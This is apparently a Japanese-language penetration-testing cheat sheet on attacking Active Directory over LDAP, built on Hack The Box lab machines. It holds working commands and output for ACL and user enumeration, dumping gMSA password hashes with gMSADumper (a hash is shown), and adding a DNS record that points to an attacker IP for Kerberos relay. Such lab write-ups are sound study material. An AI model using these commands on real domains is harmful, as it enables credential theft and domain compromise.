# Attack
----
## Basics
* ldapsearchでldapから情報を取得可能
  * `ldapsearch -x -h intelligence.htb -s base`
  * `ldapsearch -x -h intelligence.htb -b dc=intelligence,dc=htb`
  * `ldapsearch -x -D ted.graves@intelligence.htb -w Mr.Teddy -h intelligence.htb  -b dc=intelligence,dc=htb`
    * userPrincipalNameではなく、dnでもユーザを指定可能
    * -D 'cn=ted graves,cn=users,dc=intelligence,dc=htb'

## Permission 
* ldapから取得できるNTSecurityDescriptorにはACLの情報が含まれる
* `ldapsearch`ではEオプションでNTSecurityDescriptorの取得が可能
	* `ldapsearch -x -D tiffany.molina@intelligence.htb -w NewIntelligenceCorpUser9876 -h intelligence.htb -b 'dc=intelligence,dc=htb' -E '!1.2.840.113556.1.4.801=::MAMCAQQ=' `
	* 詳細は[Ldap query to get the ACL](https://stackoverflow.com/questions/67371962/ldap-query-to-get-the-acl)を参照
* LDAPでは権限の継承に二種類の方法が存在
    1. 親のディレクトリのACLを子のディレクトリが継承
    1. 子ディレクトリがセキュリティグループのメンバ（`memberof`）である場合、小ディレクトリが前記セキュリティグループの権限を継承
* リモート環境では[pywerview](https://github.com/the-useless-one/pywerview)のget-objectaclオプションで、ローカル環境ではPowerSploitのPowerViewのGet-ObjectACLで、NTSecurityDescriptorのACLをデコードした状態で取得可能
    * get-objectaclは2021年7月時点ではdevelopブランチでのみ利用可能
    
    | Name                  | Description          |
    | -------------------- | -------------------- |
    | securityidentifier    | 主体（誰が）         |
    | objectdn / objectsid  | 所属（何処の）       |
    | objectacetype         | 対象（何に）         |
    | activedirectoryrights | 動作（何を） |
    | acetype | 許可/禁止する |
    | isinherited | 上記のルールを親ディレクトリから継承した場合はTrue。定義元である場合はFalse |

## User Enumeration
* ldapからユーザを列挙
* ldapsearch, windapsearch, GetADUsersが利用可能
  * windapsearchのUオプションでは、objectClass=userであるエントリをユーザと判定
  * **ただし、objectClassが設定されていないユーザは列挙から漏れる懸念がある**
  * `ldapsearch -x -h forest.htb -b 'dc=htb,dc=local' 'objectClass=user'`も同様
  * **GetADUsersは漏れなく列挙可能なため、GetADUsersの利用が望ましい**
* HTB: Forest

  ```console
  ┌─[rio@parrot]─[~/Htb/Forest]
  └──╼ $impacket-GetADUsers -dc-ip forest.htb -all htb.local/
  Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
  
  [*] Querying forest.htb for information about domain.
  Name                  Email                           PasswordLastSet      LastLogon
  --------------------  ------------------------------  -------------------  -------------------
  Administrator         Administrator@htb.local         2019-09-19 02:09:08.342879  2019-10-07 19:57:07.299606
  Guest                                                 <never>              <never>
  DefaultAccount                                        <never>              <never>
  krbtgt                                                2019-09-18 19:53:23.467452  <never>
  $331000-VK4ADACQNUCA                                  <never>              <never>
  SM_2c8eef0a09b545acb  SystemMailbox{1f05a927-89c0-4725-adca-4527114196a1}@htb.local  <never>              <never>
  SM_ca8c2ed5bdab4dc9b  SystemMailbox{bb558c35-97f1-4cb9-8ff7-d53741dc928c}@htb.local  <never>              <never>
  SM_75a538d3025e4db9a  SystemMailbox{e0dc1c29-89c3-4034-b678-e6c29d823ed9}@htb.local  <never>              <never>
  SM_681f53d4942840e18  DiscoverySearchMailbox{D919BA05-46A6-415f-80AD-7E09334BB852}@htb.local  <never>              <never>
  SM_1b41c9286325456bb  Migration.8f3e7716-2011-43e4-96b1-aba62d229136@htb.local  <never>              <never>
  SM_9b69f1b9d2cc45549  FederatedEmail.4c1f4d8b-8179-4148-93bf-00a95fa1e042@htb.local  <never>              <never>
  SM_7c96b981967141ebb  SystemMailbox{D0E409A0-AF9B-4720-92FE-AAC869B0D201}@htb.local  <never>              <never>
  SM_c75ee099d0a64c91b  SystemMailbox{2CE34405-31BE-455D-89D7-A7C7DA7A0DAA}@htb.local  <never>              <never>
  SM_1ffab36a2f5f479cb  SystemMailbox{8cc370d3-822a-4ab8-a926-bb94bd0641a9}@htb.local  <never>              <never>
  HealthMailboxc3d7722  HealthMailboxc3d7722415ad41a5b19e3e00e165edbe@htb.local  2019-09-24 07:51:31.892097  2019-09-24 07:57:12.361516
  HealthMailboxfc9daad  HealthMailboxfc9daad117b84fe08b081886bd8a5a50@htb.local  2019-09-24 07:51:35.267114  2019-09-24 07:52:05.736012
  HealthMailboxc0a90c9  HealthMailboxc0a90c97d4994429b15003d6a518f3f5@htb.local  2019-09-19 20:56:35.206329  <never>
  HealthMailbox670628e  HealthMailbox670628ec4dd64321acfdf6e67db3a2d8@htb.local  2019-09-19 20:56:45.643993  <never>
  HealthMailbox968e74d  HealthMailbox968e74dd3edb414cb4018376e7dd95ba@htb.local  2019-09-19 20:56:56.143969  <never>
  HealthMailbox6ded678  HealthMailbox6ded67848a234577a1756e072081d01f@htb.local  2019-09-19 20:57:06.597012  <never>
  HealthMailbox83d6781  HealthMailbox83d6781be36b4bbf8893b03c2ee379ab@htb.local  2019-09-19 20:57:17.065809  <never>
  HealthMailboxfd87238  HealthMailboxfd87238e536e49e08738480d300e3772@htb.local  2019-09-19 20:57:27.487679  <never>
  HealthMailboxb01ac64  HealthMailboxb01ac647a64648d2a5fa21df27058a24@htb.local  2019-09-19 20:57:37.878559  <never>
  HealthMailbox7108a4e  HealthMailbox7108a4e350f84b32a7a90d8e718f78cf@htb.local  2019-09-19 20:57:48.253341  <never>
  HealthMailbox0659cc1  HealthMailbox0659cc188f4c4f9f978f6c2142c4181e@htb.local  2019-09-19 20:57:58.643994  <never>
  sebastien                                             2019-09-20 09:29:59.544725  2019-09-23 07:29:29.586227
  lucinda                                               2019-09-20 09:44:13.233891  <never>
  svc-alfresco                                          2021-07-14 17:33:39.955238  2019-09-23 20:09:47.931194
  andy                                                  2019-09-23 07:44:16.291082  <never>
  mark                                                  2019-09-21 07:57:30.243568  <never>
  santi                                                 2019-09-21 08:02:55.134828  <never>
  ```

## Group Managed Service Account
* `msDS-ManagedPassword`からパスワードハッシュを取得可能
* [gMSADumper](https://github.com/micahvandeusen/gMSADumper)を利用可能
* HTB: Intelligence

  ```console
  ┌─[rio@parrot]─[~/Htb/Intelligence]
  └──╼ $ldapsearch -x -D ted.graves@intelligence.htb -w Mr.Teddy -h intelligence.htb -b 'cn=svc_int,cn=managed service accounts,dc=intelligence,dc=htb'
  # extended LDIF
  #
  # LDAPv3
  # base <cn=svc_int,cn=managed service accounts,dc=intelligence,dc=htb> with scope subtree
  # filter: (objectclass=*)
  # requesting: ALL
  #
  
  # svc_int, Managed Service Accounts, intelligence.htb
  dn: CN=svc_int,CN=Managed Service Accounts,DC=intelligence,DC=htb
  objectClass: top
  objectClass: person
  objectClass: organizationalPerson
  objectClass: user
  objectClass: computer
  objectClass: msDS-GroupManagedServiceAccount
  cn: svc_int
  distinguishedName: CN=svc_int,CN=Managed Service Accounts,DC=intelligence,DC=h
   tb
  instanceType: 4
  whenCreated: 20210419004958.0Z
  whenChanged: 20210714121947.0Z
  uSNCreated: 12846
  uSNChanged: 110719
  name: svc_int
  objectGUID:: eaCA8SbzskmEoTSCQgjWQg==
  userAccountControl: 16781312
  badPwdCount: 0
  codePage: 0
  countryCode: 0
  badPasswordTime: 132707386923375218
  lastLogoff: 0
  lastLogon: 132707388154160469
  localPolicyFlags: 0
  pwdLastSet: 132694880879752841
  primaryGroupID: 515
  objectSid:: AQUAAAAAAAUVAAAARobx+nQXDcpGY+TMeAQAAA==
  accountExpires: 9223372036854775807
  logonCount: 3
  sAMAccountName: svc_int$
  sAMAccountType: 805306369
  dNSHostName: svc_int.intelligence.htb
  objectCategory: CN=ms-DS-Group-Managed-Service-Account,CN=Schema,CN=Configurat
   ion,DC=intelligence,DC=htb
  isCriticalSystemObject: FALSE
  dSCorePropagationData: 16010101000000.0Z
  lastLogonTimestamp: 132707387877640143
  msDS-AllowedToDelegateTo: WWW/dc.intelligence.htb
  msDS-SupportedEncryptionTypes: 28
  msDS-ManagedPasswordId:: AQAAAEtEU0sCAAAAZwEAAB0AAAAYAAAAWa6dT0SPVr+SpfQILta2E
   QAAAAAiAAAAIgAAAGkAbgB0AGUAbABsAGkAZwBlAG4AYwBlAC4AaAB0AGIAAABpAG4AdABlAGwAbA
   BpAGcAZQBuAGMAZQAuAGgAdABiAAAA
  msDS-ManagedPasswordPreviousId:: AQAAAEtEU0sCAAAAZwEAABsAAAAQAAAAWa6dT0SPVr+Sp
   fQILta2EQAAAAAiAAAAIgAAAGkAbgB0AGUAbABsAGkAZwBlAG4AYwBlAC4AaAB0AGIAAABpAG4AdA
   BlAGwAbABpAGcAZQBuAGMAZQAuAGgAdABiAAAA
  msDS-ManagedPasswordInterval: 30
  msDS-GroupMSAMembership:: AQAEgBQAAAAAAAAAAAAAACQAAAABAgAAAAAABSAAAAAgAgAABABQ
   AAIAAAAAACQA/wEPAAEFAAAAAAAFFQAAAEaG8fp0Fw3KRmPkzOgDAAAAACQA/wEPAAEFAAAAAAAFF
   QAAAEaG8fp0Fw3KRmPkzHYEAAA=
  
  # search result
  search: 2
  result: 0 Success
  
  # numResponses: 2
  # numEntries: 1
  ┌─[rio@parrot]─[~/Htb/Intelligence]
  └──╼ $python gMSADumper.py -d intelligence.htb -u ted.graves -p Mr.Teddy
  svc_int$:::d64b83fe606e6d3005e20ce0ee932fe2
  ```

## Add DNS Record
* ldapのエントリを書き換えることで、ldapを参照するDNSのエントリを書き換え可能
* `AuthenticatedUsers`に属するユーザは任意のレコードを新規に追加可能（`create_child`）
* ただし、自分が追加したものではないレコードの書き換えは禁止されている
* 詳細は[Beyond LLMNR/NBNS Spoofing – Exploiting Active Directory-Integrated DNS](https://www.netspi.com/blog/technical/network-penetration-testing/exploiting-adidns/)を参照

* [krbrelayx/dnstool](https://github.com/dirkjanm/krbrelayx)を利用可能

* HTB: Intelligence

  ```console
  ┌─[✗]─[rio@parrot]─[~/Htb/Intelligence]
  └──╼ $dnstool.py -u 'intelligence.htb\Tiffany.Molina' -p 'NewIntelligenceCorpUser9876' -a add -r 'web.intelligence.htb' -d 10.10.14.40 10.129.183.87
  [-] Connecting to host...
  [-] Binding to host
  [+] Bind OK
  [-] Adding new record
  [+] LDAP operation completed successfully
  ```

## Modify Service Principal Name
* 権限を有する場合、ldapへのログインユーザは、自身に設定された`servicePrincipalName`および`msDS-AdditionalDNSHostName`を書き換え可能
* 一般的にはdnstoolと併用されることが多い
  1. SPNを架空のホストのサービスに書き換える（`servicePrincipalName: HOST\dammy.com`）
  1. dnstoolを利用し架空のホストのIPアドレスに攻撃者の端末のIPアドレスを設定する（`dig dammy.com`）
* [krbrelayx/addspn](https://github.com/dirkjanm/krbrelayx)を利用可能

## Reference
----

* [“Relaying” Kerberos - Having fun with unconstrained delegation](https://dirkjanm.io/krbrelayx-unconstrained-delegation-abuse-toolkit/)
* [No Shells Required - a Walkthrough on Using Impacket and Kerberos to Delegate Your Way to DA](http://blog.redxorblue.com/2019/12/no-shells-required-using-impacket-to.html)